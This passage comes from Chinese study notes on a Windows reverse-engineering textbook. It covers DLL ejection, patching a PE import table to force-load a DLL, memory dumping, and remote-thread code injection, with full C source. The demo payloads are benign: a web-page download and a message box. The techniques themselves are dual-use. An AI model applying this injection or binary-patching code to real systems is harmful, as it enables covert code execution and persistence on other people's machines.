CloseHandle(hSnapshot);\n        return FALSE;\n    &#125;\n\t// 获得目标进程的句柄\n    if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))\n    &#123;\n        _tprintf(L\"OpenProcess(%d) failed!!! [%d]\\n\", dwPID, GetLastError());\n        return FALSE;\n    &#125;\n\t// 获得 FreeLibrary 的地址\n    hModule = GetModuleHandle(L\"kernel32.dll\");\n    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, \"FreeLibrary\");\n    // 在目标进程中运行 FreeLibrary\n    // me.modBaseAddr 指的是 myhack.dll 的基址\n    hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, me.modBaseAddr, 0, NULL);\n    WaitForSingleObject(hThread, INFINITE);\t\n\n    CloseHandle(hThread);\n    CloseHandle(hProcess);\n    CloseHandle(hSnapshot);\n\n    return TRUE;\n&#125;\n\nint _tmain(int argc, TCHAR* argv[])\n&#123;\n    DWORD dwPID = 0xFFFFFFFF;\n \n    // find process\n    dwPID = FindProcessID(DEF_PROC_NAME);\n    if( dwPID == 0xFFFFFFFF )\n    &#123;\n        _tprintf(L\"There is no &lt;%s> process!\\n\", DEF_PROC_NAME);\n        return 1;\n    &#125;\n\n    _tprintf(L\"PID of \\\"%s\\\" is %d\\n\", DEF_PROC_NAME, dwPID);\n\n    // change privilege，同上\n    if( !SetPrivilege(SE_DEBUG_NAME, TRUE) )\n        return 1;\n\n    // eject dll，卸载dll\n    if(EjectDll(dwPID, DEF_DLL_NAME))\n        _tprintf(L\"EjectDll(%d, \\\"%s\\\") success!!!\\n\", dwPID, DEF_DLL_NAME);\n    else\n        _tprintf(L\"EjectDll(%d, \\\"%s\\\") failed!!!\\n\", dwPID, DEF_DLL_NAME);\n\n    return 0;\n&#125;\n\n24.2.1 获取进程中加载的DLL信息hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID);\n\n\n使用CreateToolhelp32Snapshot（） API可以获取加载到进程的模块(DLL)信息。\n将获取的hSnapshot句柄传递给Module32First()&#x2F;Module32Next()函数后，即可设置与MODULEENTRY32结构体相关的模块信息。\n代码24-2是MODULEENTRY32结构体的定义。\n\n\n\n\n\nszModule成员表示DLL的名称，modBaseAddr成员表示相应DLL被加载的地址(进程虚拟内存)。\n\n在EjectDII()函数的for循环中比较szModule与希望卸载的DLL文件名称，能够准确查找到相应模块的信息。\nMODULEENTRY32 me = &#123;sizeof(me)&#125;;\nbMore = Module32First(hSnapshot, &amp;me);\nfor(; bMore; bMore = Module32Next(hSnapshot, &amp;me))\n&#123;\n    if(!_tcsicmp((LPCTSTR)me.szModule, szDllName) || !_tcsicmp((LPCTSTR)me.szExePath, szDllName))\n    &#123;\n        bFound = TRUE;\n        break;\n    &#125;\n&#125;\n\n24.2.2 获取目标进程的句柄hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)\n\n\n使用进程ID来获取目标进程的句柄\n\n24.2.3 获取FreeLibrary() API地址hModule &#x3D; GetModuleHandle(L&quot;kernel32.dll&quot;);\npThreadProc &#x3D; (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, &quot;FreeLibrary&quot;);\n\n\n这里获取的是加载到EjectDll.exe的Kernel32.dll的FreeLibrary的地址，而不是获取的notepad.exe的Kernel32.dll地址，前面说过了，DLL不会重定位，加载到固定位置\n\n总结Q：使用FreeLibrary()卸载DLL的方法好像仅适用于使用CreateRemoteThread()注入的DLL文件，有没有什么方法可以将加载的普通DLL文件卸载下来呢?\n\n使用FreeLibrary()的方法仅适用于卸载自己强制注入的DLL文件。\nPE文件直接接导入的DLL文件是无法在进程运行过程中卸载的。\n\nQ：前置知识\n\nIMAGE_IMPORT_DESCRIPTOR中记录了PE文件要导入哪些文件\n\n0x25 通过修改PE加载DLLQ：除了前面的DLL动态注入，还有什么方法可以让用户加载指定的DLL文件？\n\n利用手工修改可执行文件\n通过“直接修改目标程序的可执行文件”，使其运行时强制加载指定的DLL文件。\n\n\n这种方法只要应用过一次后(不需要另外的注人操作)，每当进程开始运行时就会自动加载指定的DLL、\n\n25.1 练习文件Q：目标\n\n直接修改TextView.edxe，让它在运行时自动加载myhack3.dll\n\n25.1.1 TextView.exe\n用peview打开，查看IMPORT DIRECTORY TABLE（也就是IMAGE_IMPORT_DESCRIPTOR结构体）\n\n\n\n25.1.2 TextView_patched.exe\n\nTextView_patched的IDT比上面多了一个myhack3.dll\n\n运行这个程序，发现会自动下载index.html文件，因为会自动加载myhack3.dll，打开后是google网站\n\n\n\n25.2 源代码myhack3.cpp25.2.1 DllMain()// myhack3.cpp -> myhack3.dll\n#include \"stdio.h\"\n#include \"windows.h\"\n#include \"shlobj.h\"\n#include \"Wininet.h\"\n#include \"tchar.h\"\n//是一个预处理指令，用于告诉编译器在链接阶段将Wininet.lib 库文件包含到可执行文件中。\n#pragma comment(lib, \"Wininet.lib\")\n\n#define DEF_BUF_SIZE            (4096)\n#define DEF_URL                 L\"http://www.google.com/index.html\"\n#define DEF_INDEX_FILE          L\"index.html\"\n\nDWORD WINAPI ThreadProc(LPVOID lParam)\n&#123;\n    TCHAR szPath[MAX_PATH] = &#123;0,&#125;;\n    TCHAR *p = NULL;\n\t// debugview 可以调试\n    OutputDebugString(L\"ThreadProc() start...\");\n\n    GetModuleFileName(NULL, szPath, sizeof(szPath));\n    \n    if(p = _tcsrchr(szPath, L'\\\\'))\n    &#123;\n        // szPath = 当前路径 + index.html\n        _tcscpy_s(p+1, wcslen(DEF_INDEX_FILE)+1, DEF_INDEX_FILE);\n\n        OutputDebugString(L\"DownloadURL()\");\n        // 下载 google 首页到 szPath\n        if(DownloadURL(DEF_URL, szPath))\n        &#123;\n            OutputDebugString(L\"DropFlie()\");\n            DropFile(szPath);\n        &#125;\n    &#125;\n\n    OutputDebugString(L\"ThreadProc() end...\");\n    return 0;\n&#125;\n\nBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)\n&#123;\n    switch(fdwReason)\n    &#123;\n        case DLL_PROCESS_ATTACH: \n            // DLL运行时自动调用 ThreadProc\n            CloseHandle(CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL));\n            break;\n    &#125; \n    return TRUE;\n&#125;\n\n\n创建线程运行指定的函数，下载指定的网页\n\n25.2.2 DownloadURL()\n// 下载url文件\nBOOL DownloadURL(LPCTSTR szURL, LPCTSTR szFile)\n&#123;\n    BOOL            bRet = FALSE;\n    HINTERNET\t    hInternet = NULL, hURL = NULL;\n    BYTE            pBuf[DEF_BUF_SIZE] = &#123;0,&#125;;\n    DWORD           dwBytesRead = 0;\n    FILE            *pFile = NULL;\n    errno_t         err = 0;\n\n    // 初始化数据结构\n    hInternet = InternetOpen(L\"ReverseCore\", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);\n    if(NULL == hInternet)\n    &#123;\n        OutputDebugString(L\"InternetOpen() failed!\");\n        return FALSE;\n    &#125;\n    // 访问网址\n    hURL = InternetOpenUrl(hInternet, szURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);\n    if(NULL == hURL)\n    &#123;\n        OutputDebugString(L\"InternetOpenUrl() failed!\");\n        goto _DownloadURL_EXIT;\n    &#125;\n    // 打开index.html文件\n    if(err = _tfopen_s(&amp;pFile, szFile, L\"wt\"))\n    &#123;\n        OutputDebugString(L\"fopen() failed!\");\n        goto _DownloadURL_EXIT;\n    &#125;\n\t// 写入index.html文件\n    while(InternetReadFile(hURL, pBuf, DEF_BUF_SIZE, &amp;dwBytesRead) )\n    &#123;\n        if(!dwBytesRead)\n            break;\n        fwrite(pBuf, dwBytesRead, 1, pFile);\n    &#125;\n    bRet = TRUE;\n_DownloadURL_EXIT:\n    if(pFile)\n        fclose(pFile);\n    if(hURL)\n        InternetCloseHandle(hURL);\n    if(hInternet)\n        InternetCloseHandle(hInternet);\n    return bRet;\n&#125;\n\n\n\n\n上面使用的API都是在urlmon.dll中\n\n25.2.3 DropFile()\nBOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam)\n&#123;\n    DWORD dwPID = 0;\n    GetWindowThreadProcessId(hWnd, &amp;dwPID);\n    if(dwPID == (DWORD)lParam)\n    &#123;\n        g_hWnd = hWnd;\n        return FALSE;\n    &#125;\n    return TRUE;\n&#125;\n\n\nHWND GetWindowHandleFromPID(DWORD dwPID)\n&#123;\n    // 枚举窗口\n    EnumWindows(EnumWindowsProc, dwPID);\n    return g_hWnd;\n&#125;\n\n// 将下载的index.html文件拖放到被注入进程（TextView_Patch.exe）中并显示内容\nBOOL DropFile(LPCTSTR wcsFile)\n&#123;\n    HWND            hWnd = NULL;\n    DWORD           dwBufSize = 0;\n    BYTE            *pBuf = NULL; \n    DROPFILES\t   *pDrop = NULL;\n    char            szFile[MAX_PATH] = &#123;0,&#125;;\n    HANDLE          hMem = 0;\n\t// szFile存index.html中的内容\n    WideCharToMultiByte(CP_ACP, 0, wcsFile, -1, szFile, MAX_PATH, NULL, NULL);\n\n    dwBufSize = sizeof(DROPFILES) + strlen(szFile) + 1;\n    \n    if(!(hMem = GlobalAlloc(GMEM_ZEROINIT, dwBufSize)))\n    &#123;\n        OutputDebugString(L\"GlobalAlloc() failed!!!\");\n        return FALSE;\n    &#125;\n\t// 将szFile中的内容放到pBuf中\n    pBuf = (LPBYTE)GlobalLock(hMem);\n    pDrop = (DROPFILES*)pBuf; \n    pDrop->pFiles = sizeof(DROPFILES);\n    strcpy_s((char*)(pBuf + sizeof(DROPFILES)), strlen(szFile)+1, szFile);\n    GlobalUnlock(hMem);\n\t// 获得当前进程（TextView_Patch.exe）的pid\n    if(!(hWnd = GetWindowHandleFromPID(GetCurrentProcessId())))\n    &#123;\n        OutputDebugString(L\"GetWndHandleFromPID() failed!!!\");\n        return FALSE;\n    &#125;\n\t// 将pBuf发送给TextView_Patch.exe\n    PostMessage(hWnd, WM_DROPFILES, (WPARAM)pBuf, NULL);\n    return TRUE;\n&#125;\n\n\n\nDropFile()函数将下载的index.html文件拖放到TextView_Patch.exe进程并显示其内容。\n为此，需要先获取TextView_Patchexe进程的主窗口句柄，再传送WM_DROPFILES消息。\n总之，DropFile()函数的主要功能是，使用PID获取窗口句柄，再调用postMessage(WM_DROPFILES)API将消息放入消息队列(\n\n25.2.4 dummy()#ifdef __cplusplus\nextern \"C\" &#123;\n#endif\n// 出现在 IDT 中的 dummy export function...\n__declspec(dllexport) void dummy()\n&#123;\n    return;\n&#125;\n#ifdef __cplusplus\n&#125;\n#endif\n\n\n可以看到是myhack3.dll向外部提供服务的导出函数，保证形式上的完整性\n上面从25.2.1到25.2.4是在一个myhack3.dll的文件中的\n\n**Q：DLL中存着很多函数，可以理解为API **\n\n在PE文件中导人某个DLL，实质就是在文件代码内调用该DLL提供的导出函数。\nPE文件头中记录着DLL名称、函数名称等信息。\n\n因此，myhack3.dll至少要向外提供1个以上的导出函数才能保持形式上的完整性。\n25.3 修改TextView.exe文件的准备工作Q：前置知识\n\nPE文件中导人的DLL信息以结构体列表形式存储在IDT中。\n只要将myhack3.dll添加到列表尾部就可以了。\n当然，此前要确认一下IDT中有无足够空间。\n\nQ：查看IDT中是否有足够空间\n\n查看IDT的地址\n\n\n查看84CC地址，在.rdata节区，下一个节区的起始地址为8530，所以整个IDT是从84CC~842F，共0x64个字节\n\n&#x3D;&#x3D;正常情况下每个IID结构体的大小是14字节&#x3D;&#x3D;\nIDT是由IMAGE_IMPORT_DESCRIPTOR结构体构成的数组，数组结尾是null\n从下图可以看出一共有5个结构体（因为16进制的乘法14 x 5 &#x3D; 60），最后一个是null\n\n\n\n使用HexEditor查看该空间，可以看出IDT尾部7719处仍有其他数据，所以无法添加myhack3.dll结构体。\n\n\n\nQ：移动IDT\n\n在上面这种空间不足的情况下，要把整个IDT移动到更广阔的位置，然后添加新的IDT\n\nQ：可使用的方法\n\n查找文件中的空白区域\n\n增加文件最后一个节区的大小\n\n在文件末尾添加新节区。\n\n\nQ：对于第一种方法\n\n查找空白区域\n\n\n.rdata节区的尾部存在着空白区域\n\n一般来说节区或文件末尾存在空白区域，成为Null-Padding区域\n\n\n\n\n移动IDT到Null-padding区域\n\n\n首先要确认该区域是不是空白可用区域，并不是文件中的所有区域都会被无条件加载到进程的虚拟内存，只有节区头中记录的才会被加载\n\n节区头中记录的就相当于真正属于这个节区的，因为需要满足Section Alignment的整数倍\n\n\n查看节区头\n\n\n\n\n\n也就是只有红圈部分才会被映射到内存中，所以在7E56到8000区域是程序未使用的区域，大小为1AA是可以创建IDT的\n\n其实直接看PEview是能看出来的，7E56后面没数据了\n\n\n\n\n\n\n\n\n\n\n\n提示\nPE 文件尾部有些部分填充着 NULL，但这并不意味着这些部分一定就是Null-Padding区域(空白可用区域)。\n这些区域也有可能是程序使用的区域，且并非所有Null-Padding 区域都会加载到内存。\n只有分析节区头信息后才能判断。如果示例中那么就要增加最后节区的尺寸TextView.exe的Nul-Padding区域很小，无法容纳IDT或添加新节区，以保证有足够空间存放 IDT。\n\n\n25.4 修改TextView.exeQ：步骤\n\n把TextView.exe复制到工作文件夹，重命名为TextView_Patch.exe。\n用PEView打开TextView,exe源文件，查看各种PE信息，使用HxD打开TextView_Patch.exe文件进行修改\n\n25.4.1 修改导入表的RVA值\n\n原来是84CC，改成新的导入地址8C80，在Size的基础上加14字节，因为要新增加一个DLL，一个IMAGE_IMPORT_DESCRIPTOR结构体的大小是14bytes\n\n\n\n25.4.2 删除绑定导入表Q：BOUND IMPORT TABLE 绑定导入表是一种提高DLL加载速度的技术\n\n若想正常导人myhack3.dll，需要向绑定导人表添加信息。\n但幸运的是，该绑定导人表是个可选项，不是必须存在的，所以可删除(修改其值为0即可)以获取更大便利。\n当然，绑定导入表完全不存在也没关系，但若存在，且其内信息记录错误，则会在程序运行时引发错误。\n本示例TextView.exe文件中，绑定导人表各项的值均为0，不需要再修改。修改其他文件时，一定要注意检查绑定导人表中的数据\n\n\n25.4.3 创建新IDT\n先完全复制原IDT(RAW：76CC 到772F），复制到新IDT RAW: 7E80  RVA：8C80\n\n\n\n在新的IDT尾部(RAW：7ED0）添加myhack3.dll的IId\n\n\n\n\n25.4.4 设置Name、INT、IAT\n前面添加的IID结构体成员拥有指向其他数据结构(INT、Name、IAT)的RVA值。\n\n因此，必须准确设置这些数据结构才能保证TextView Patchexe文件正常运行。\n\n前面填的值记录如下：\n\n\n这个8D00、8D10、8D20是为了方便选择的空白区域，在新创建的反正是要往里面添加数据，所以选择其他位置也可以\n\n\n在PEVIEW中对照查看\n\n\n\nQ：上面各值的含义\n\n8D00处存储着IMPORT NAME TABLE，是RVA数组，数组的每个元素由导人函数的Ordixnal(2个字节)+Func Name String结构体构成，末尾为null\n存储着值为8D30，是导入的函数的Ordinal，名称是dummy\n\n\nName就是库的名称\nIAT也是RVA数组，各元素既可以拥有与INT相同的值，也可以拥有其他不同值\n(若INT中的数据准确，IAT也可拥有其他不同值。反正实际运行时，PE装载器会将虑拟内存中的IAT替换实际函数的地址。\n\n\n\n25.4.5 修改IAT节区的属性值\n加载PE文件到内存时，PE装载器会修改IAT，写人函数的实际地址，所以相关节区一定要拥有WRITE(可写)属性。\n\n只有这样，PE装载器才能正常进行写人操作。使用PEView看rdata节区头中的Characteristics属性\n\n这个4000 0040，是通过0000 0040  4000 0000  进行或运算得到的\n\n\n\n参照之间的笔记\n\n\n\n\n向原属性值(Characteristics)40000040，添加IMAGE_SCN_MEM_WRITE值(8000 0000)，执行bit OR运算，最终属性值变为C0000040\n\n\n\nQ：问题来了\n\n上面修改.rdata的原因是，因为PE装载器在装载过程中会修改IAT为实际的函数地址，所以需要把.rdata区域的权限修改为可写\n\n但是正常人家是咋执行的呢，你不改，没写权限，如何执行正常的PE装载过程呢\n\n因为在IMAGE_OPTIONAL_HEADER的data directory数组里面存在IAT，相当于告诉我们IAT的地址是从6000到6154\n\n\n查看Textview.exe的IAT(IMPORT ADDRESS TABLE)，发现IAT从6000到614C都在optional header规定的范围内，记录了函数的地址\n\n\n\n所以即使该节区没有可写属性也没关系，因为IAT已经构造完了，不再需要PE装载器写了。\n\n\n\n所以也可以不给.rdata节区添加可写属性，可以在已经存在的IAT区域后为dummy()添加IAT，相当于不需要PE装载器装载了，自己手动添加的，然后把IAT(size)增加8字节。\n\nIAT是4字节数组\n\n\n\n25.5 检测验证\n打开修改后的TextView_Patch.exe，查看IDT，发现多了一个myhack3.dll。并且dummy()被加入到了IAT中\n\n\n\n\n、\nQ：对比改IDT和直接改IAT\n\n下图是直接在IAT后添加dummy的结果，黄色区域为新添加的idt结构体，RVA：8D00（RAW：7F00）是INT的位置，RVA：8D10 (RAW：7F10)是DLL Name，7EE0处存储的是IAT的地址\n\n对比和上面的不同之处，发现7EE0处变成了RVA：6154 (RAW：5354)\n\n\n也就是在原有的IAT后面新增了dummy\n\n\n\n\n\n\n\npe装载器在读取idt时，读到的myhack3.dll中的IAT的地址和上面改iDT方法的地址不一样了，现在是在RAW：5354中了。\n\n&#x3D;&#x3D;Q：但是这里为什么没有改size呢？&#x3D;&#x3D;\n\n\n0x26 PE Tools26.1 PE Tools\n下载PE Tools\n它可以获取系统中正在运行的所有进程的列表，并显示在主窗口\n\n26.1.1 进程内存转储\n转储(Dump)：将内存中的内容转存到文件\n转储技术主要用来查看正在运行的进程内存中的内容。文件是运行时解压缩文件时，其只有在内存中才以解压缩形态存在，\n此时借助转储技术可以轻松查看与源文件类似的代码与数据。\n\n\n\n\n\n\n\n提示\n\n使用 PE保护器时，文件在内存中仍处于压缩与加密状态，即便应用内存转储技术也往往无法准确把握文件内容。并且常常因为使用 Anti-Dump(反转储)技术而给转储带来很大困难\n在调试器中将正在运行的进程附加进来后，能够直接准确查看进程内存中的内容。而使用PETools 的转储功能只是因为它比使用调试器更加容易、方便，特别是查看运行时压缩程序时，通过转储功能可以更快速、更简单地查看内存中的字符串等。\n\n\n\nQ：PE Tools为用户提供了3个转储选项\n\nDump Full(完整转储)：使用该选项时，PE Tools会检测进程的PE文件头，并从ImageBase地址开始转储SizeOfImage大小的区域(该区域即是PE文件被加载到内存后的映像大小)\nPE Image：就是PE文件加载到内存中的形态，成为PE映像\n\n\nDump Patial(部分转储)：该功能用来从相应进程内存的指定地址开始转储指定大小的部分\nDump Region(区域转储）：进程内存(用户区域)中所有分配区域都被标识为某种状态，区域转储功能用于转储状态(State)标识为COMMIT的内存区域。\n\n26.1.2 PE编辑器\n\n会列出PE文件头的各种信息，可以对他进行修改\n\n0x27 代码注入27.1 代码注入代码注入是一种向目标进程插入独立运行代码并使之运行的技术，它一般调用CreateRemoteThread()API以远程线程形式运行插入的代码，所以也被称为线程注入。\n\nQ：具体过程\n\n首先向目标进程target.exe插入代码和数据\n代码以线程过程(Thread Procedure)形式插入，代码中使用的数据以线程参数的形式传入。\n也就是代码和数据是分别注入的\n\n27.2 DLL注入与代码注入Q：DLL注入\n\n\n对于这段弹出Windows消息框的代码，在用DLL注入时，需要放入某个DLL文件，然后把整个DLL文件注入目标进程。\n\n注入完成后，运行Ollybdg，查看Threadproc()的代码区域\n\n\n这两条push 10009290 push 1000929c指令，将这个函数要用的数据存到栈，\n\ncall指令在调用函数，100080F0是DLL的IAT区域，DLL中使用的所有数据位于DLL的数据区域，\n\n整个DLL会被插入目标进程，代码和数据是共存的，所以代码能够正常运行。\n\n\nQ：代码注入\n\n代码注入仅向目标进程注入代码，要想让代码正常运行，也需要将代码中使用的数据一同注入，通过编程将注入的数据地址明确告知代码\n\nQ：使用代码注入的原因\n\n占用内存少\n\n\n如果要注入的代码与数据较少，那么就不需要将它们做成DLL的形式再注入。\n此时直接采用代码注人的方式同样能够获得与DLL注入相同的效果，且占用的内存会更少。\n\n\n难以查找痕迹\n其他\n\n\nDLL注人技术主要用在代码量大且复杂的时候，而代码注人技术则适用于代码量小且简单的情况。\n\n27.3 练习实例27.3.1 测试\n运行notepad.exe\n以管理员模式运行codeinjection.exe，发现notepad.exe上弹出窗口\n\n\n27.4 CodeInjection.cppmain函数\n\n主要是获取命令行参数，并传入到InjectCode中\n\nThreadProc()函数\n该函数是要注入目标进程的代码，是线程函数\n\ninclude \"windows.h\"\n#include \"stdio.h\"\n\ntypedef struct _THREAD_PARAM \n&#123;\n    FARPROC pFunc[2];               // LoadLibraryA(), GetProcAddress()\n    char    szBuf[4][128];          // \"user32.dll\", \"MessageBoxA\", \"www.reversecore.com\", \"ReverseCore\"\n&#125; THREAD_PARAM, *PTHREAD_PARAM;\n\ntypedef HMODULE (WINAPI *PFLOADLIBRARYA)\n(\n    LPCSTR lpLibFileName\n);\n\n// 等同于GetProcAddress()函数\ntypedef FARPROC (WINAPI *PFGETPROCADDRESS)\n(\n    HMODULE hModule,\n    LPCSTR lpProcName\n);\n\n// 等同于MessageBoxA()函数\ntypedef int (WINAPI *PFMESSAGEBOXA)\n(\n    HWND hWnd,\n    LPCSTR lpText,\n    LPCSTR lpCaption,\n    UINT uType\n);\n\n// 在目标进程中执行代码\nDWORD WINAPI ThreadProc(LPVOID lParam)\n&#123;\n    PTHREAD_PARAM   pParam      = (PTHREAD_PARAM)lParam;\n    HMODULE         hMod        = NULL;\n    FARPROC         pFunc       = NULL;\n\n    // LoadLibrary()\n    hMod = ((PFLOADLIBRARYA)pParam->pFunc[0])(pParam->szBuf[0]);    // \"user32.dll\"\n    if(!hMod)\n        return 1;\n\n    // GetProcAddress()\n    pFunc = (FARPROC)((PFGETPROCADDRESS)pParam->pFunc[1])(hMod, pParam->szBuf[1]);  // \"MessageBoxA\"\n    if(!pFunc)\n        return 1;\n\t// 前面为了找到目标进程中MessageBoxA的地址\n    // MessageBoxA()\n    ((PFMESSAGEBOXA)pFunc)(NULL, pParam->szBuf[2], pParam->szBuf[3], MB_OK);\n\n    return 0;\n&#125;\n\n\n\n上述代码中实际被注入的是ThreadProc()函数，&#x3D;&#x3D;前面的typedef是针对C语言语法的，不需要注入。&#x3D;&#x3D;\n\n整理上面的代码，就是在进行函数调用\nhMod = LoadLibraryA(\"user32.dll);\npFunc=GetProcAddress(hMod，“MessageBoxA\");\npFunc(NULL，“www.reversecore.com”，“ReverseCore\"，MB_OK);\n\nQ：代码注入的核心\n\n是注入可独立运行的代码，为此需要同时注入代码和数据，并且需要能够准确引用注入的数据。\n上面用了各种函数，LoadLibraryA()、ThreadProc()等，并没有直接调用相关API，也没有直接定义字符串，都是通过THREAD_PARAM结构体，以线程参数的形式传入\n\nQ：如果ThreadProc()函数在一个普通程序中，函数代码会是\n\n\n在编译代码后，用调试器调试生成的文件\n\n\n如果在10001000到10001016区域注入其他的进程，那代码会无法运行，因为运行函数所需要的数据不在当前进程中，要使代码正常工作，必须向10009290这些地址注入正确的字符串，同时Push的地址也要正确。\n\n\nQ：为了满足代码和数据同时注入的条件，以及正确引用\n\n用THREAD_PARAM结构体来接收2个API地址和4个字符串数据\n就理解成在目标进程内创建了一个线程，并用THREAD_PARAM结构体接收了线程参数，代码和数据是同时注入的，这样就不会有问题了\n\nQ：使用调试器调试ThreadProc()函数\n\n可以看到所有重要的数据都是从lParam[EBP + 8]处获取的\n和图27-8最大的不同是，并没有直接引用硬编码地址的数据，(我的理解是把参数加载到了寄存器中)，是可以独立运行的代码\n\n\nInjectCode函数\n是代码注入的核心部分\n\n// 向目标进程中注入代码与数据\nBOOL InjectCode(DWORD dwPID)\n&#123;\n    HMODULE         hMod            = NULL;\n    THREAD_PARAM    param           = &#123;0,&#125;;\n    HANDLE          hProcess        = NULL;\n    HANDLE          hThread         = NULL;\n    LPVOID          pRemoteBuf[2]   = &#123;0,&#125;;\n    DWORD           dwSize          = 0;\n\n    hMod = GetModuleHandleA(\"kernel32.dll\");\n\n    // set THREAD_PARAM\n\t// 设置参数\n    param.pFunc[0] = GetProcAddress(hMod, \"LoadLibraryA\");\n    param.pFunc[1] = GetProcAddress(hMod, \"GetProcAddress\");\n    strcpy_s(param.szBuf[0], \"user32.dll\");\n    strcpy_s(param.szBuf[1], \"MessageBoxA\");\n    strcpy_s(param.szBuf[2], \"www.reversecore.com\");\n    strcpy_s(param.szBuf[3], \"ReverseCore\");\n\n    // Open Process\n    if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS,    // dwDesiredAccess\n                                  FALSE,                // bInheritHandle\n                                  dwPID)))              // dwProcessId\n    &#123;\n        printf(\"OpenProcess() fail : err_code = %d\\n\", GetLastError());\n        return FALSE;\n    &#125;\n\n    // Allocation for THREAD_PARAM\n    dwSize = sizeof(THREAD_PARAM);\n    if(!(pRemoteBuf[0] = VirtualAllocEx(hProcess,           // hProcess\n                                      NULL,                 // lpAddress\n                                      dwSize,               // dwSize\n                                      MEM_COMMIT,           // flAllocationType\n                                      PAGE_READWRITE)))     // flProtect\n    &#123;\n        printf(\"VirtualAllocEx() fail : err_code = %d\\n\", GetLastError());\n        return FALSE;\n    &#125;\n\n\t// 向dwPID进程中写入所需的参数\n    if(!WriteProcessMemory(hProcess,                        // hProcess\n                            pRemoteBuf[0],                  // lpBaseAddress\n                            (LPVOID)&amp;param,                 // lpBuffer\n                            dwSize,                         // nSize\n                            NULL))                          // [out] lpNumberOfBytesWritten\n    &#123;\n        printf(\"WriteProcessMemory() fail : err_code = %d\\n\", GetLastError());\n        return FALSE;\n    &#125;\n\n    // Allocation for ThreadProc()\n\t// 向dwPID进程中写入ThreadProc函数\n    dwSize = (DWORD)InjectCode - (DWORD)ThreadProc;\n    if(!(pRemoteBuf[1] = VirtualAllocEx(hProcess,           // hProcess\n                                      NULL,                 // lpAddress\n                                      dwSize,               // dwSize\n                                      MEM_COMMIT,           // flAllocationType\n                                      PAGE_EXECUTE_READWRITE)))    // flProtect\n    &#123;\n        printf(\"VirtualAllocEx() fail : err_code = %d\\n\", GetLastError());\n        return FALSE;\n    &#125;\n\n    if(!WriteProcessMemory(hProcess,                        // hProcess\n                            pRemoteBuf[1],                  // lpBaseAddress\n                            (LPVOID)ThreadProc,             // lpBuffer\n                            dwSize,                         // nSize\n                            NULL))                          // [out] lpNumberOfBytesWritten\n    &#123;\n        printf(\"WriteProcessMemory() fail : err_code = %d\\n\", GetLastError());\n        return FALSE;\n    &#125;\n\n\t// 创建远程线程，以执行代码\n    if(!(hThread = CreateRemoteThread(hProcess,             // hProcess\n                                       NULL,                // lpThreadAttributes\n                                       0,                   // dwStackSize\n                                       (LPTHREAD_START_ROUTINE)pRemoteBuf[1],   // lpStartAddress\n                                       pRemoteBuf[0],       // lpParameter\n                                       0,                   // dwCreationFlags\n                                       NULL)))              // lpThreadId\n    &#123;\n        printf(\"CreateRemoteThread() fail : err_code = %d\\n\", GetLastError());\n        return FALSE;\n    &#125;\n\n    WaitForSingleObject(hThread, INFINITE);\t\n\n    CloseHandle(hThread);\n    CloseHandle(hProcess);\n\n    return TRUE;\n&#125;\n\n\n\n\n与DLL注入非常相似，在这个函数中，InjectCode()函数的THREAD_PARAM部分用来设置THREAD_PARAM的结构体变量，会注入目标进程，并以参数形式传递给ThreadProc()函数\n\n设置好THREAD_PARAM结构体后，接着调用了一系列API函数，整理如下：\n\n\n主要是在目标进程中分别为data和code分配内存，并把它们注入目标进程\n最后调用CreateRemoteThread() API，执行远程线程\n\n\n\n27.5 代码注入调试27.5.1 调试notepad.exe&#x3D;&#x3D;这里我的调试一直有问题&#x3D;&#x3D;\n0x28 使用汇编语言编写注入代码之前的注入代码，ThreadProc()函数，是用C编写的\n现在要用纯汇编语言编写ThreadProc()函数，注入notepad.exe进程\n28.2 汇编编程本章使用OllbDbg的汇编功能编写程序\n28.3 Ollydbg的汇编命令Q：使用Ollydbg的New orign here\n\n找到代码的最顶端\n\n右键执行New orign  here，此时的EIP变成了当前的地址401000\n\n\n\n\n\n\n\n\n\n提示\nNew orign here只是改变了EIP的值，和直接调试到指定地址不一样，因为栈和寄存器中的内容没改变\n\n\n28.3.1 编写ThreadProc()函数使用汇编语言编写ThreadProc()函数，与c语言不同之处在于需要的data已经包含在code中了\nQ：首先写汇编代码\n\n从401001到40102E处按照书上编写汇编代码，用space打开assemble窗口\n在401033处用ctrl +  E打开编辑窗口，输入ReverseCore，因为字符串最后必须以NULL结束，所以在最后输入00\n\n\nQ：输入完成后，可以看到下面的区域\n\n\n也就是这部分显示的是我刚才输入的ReverseCore字符串，但是使用了很奇怪的指令显示\nOllydbg的Disassemble(反汇编器)把字符串误认为了是IA-32指令，因为我们在code的位置输入了字符串\n\nQ：选中字符串区域，执行Analysis(快捷键ctrl + A)，得到下面的结果\n\n\n书上说在401033处可以看到前面输入的字符串，但是我这里并没有看到\nOllydbg无法将代码和数据100%的区分开\n使用右键可以remove analysis，使代码变回原来的样子\n\n\n\n\n\n\n\n提示\nOllydbg的Analysis命令用来再次分析代码，在分析Unpack(解码)的代码时经常用到\n\n\nQ：按照书上继续编写汇编代码，编写完成后，如下所示\n\n28.3.2 保存文件\n编写完成后，鼠标右键copy to executable all modifications，选择copy all\n\n28.4 编写代码注入程序Q：在内存窗口转到401000地址处\n\n由于前面创建的asmtest_patch.exe的起始地址是401000，所以转到这个地址\n\n\nThreadProc()函数的地址区间为(401000 到401061)，也就是上面汇编程序的地址区间，选中该地址区域，执行copy to file ，保存为.txt文件\n\n\nQ：打开刚才保存的.txt文件，去除不必要的部分，给每个字节前面增加0x\n\n这就看起来很像C语言的字节数组，这就是要注入的Hex代码，CodeInjection2.cpp中会用到\n\n\n28.4.2 CodeInjection.cpp\n刚才.txt的内容被保存到了g_InjectionCode数组中\n\n#include \"windows.h\"\n#include \"stdio.h\"\n\ntypedef struct _THREAD_PARAM \n&#123;\n    FARPROC pFunc[2];               // LoadLibraryA(), GetProcAddress()\n&#125; THREAD_PARAM, *PTHREAD_PARAM;\n\nBYTE g_InjectionCode[] 